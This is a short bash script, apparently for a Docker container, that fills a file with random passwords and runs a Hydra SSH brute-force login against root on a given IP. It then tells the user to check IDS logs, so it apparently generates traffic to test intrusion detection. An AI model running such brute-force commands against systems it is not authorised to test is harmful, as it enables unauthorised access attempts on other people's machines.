#!/usr/bin/env bash

# Aceita IP via argumento na linha de comando ($1) ou variável de ambiente
if [ -n "$1" ]; then
    # IP passado como argumento: docker run brute-force-ssh 192.168.1.100
    TARGET_HOST="$1"
elif [ -n "$TARGET_IP" ]; then
    # Variável de ambiente: docker run -e TARGET_IP="..." brute-force-ssh
    TARGET_HOST="$TARGET_IP"
elif [ -n "$TARGET_HOST" ]; then
    TARGET_HOST="$TARGET_HOST"
else
    # Fallback: tenta ler de target.var se existir
    if [ -f /tmp/target.var ]; then
        source /tmp/target.var
    else
        echo "[ERROR] Please provide TARGET_IP as argument or environment variable"
        echo "Usage: docker run --rm --network host brute-force-ssh <TARGET_IP>"
        echo "   or: docker run --rm --network host -e TARGET_IP=<IP> brute-force-ssh"
        exit 1
    fi
fi

echo "[+] Starting SSH Brute Force Attack"
echo "[+] Target: ${TARGET_HOST}:22"
echo "[+] Generating password list..."

PWDS="/tmp/pass.lst"
rm -f "${PWDS}"
for i in $( seq 1 100 ); do
	cat /dev/urandom | tr -dc "a-zA-Z0-9" | fold -w 24 | head -n 1 >> "${PWDS}"
done

echo "[+] Executing Hydra brute force attack..."
timeout 10 /usr/bin/hydra -l root -P ${PWDS} ssh://${TARGET_HOST}
echo "TARGET_HOST: ${TARGET_HOST}"

echo ""
echo "[+] Brute Force Attack completed!"
echo "[+] Check your IDS logs for SSH brute force detections"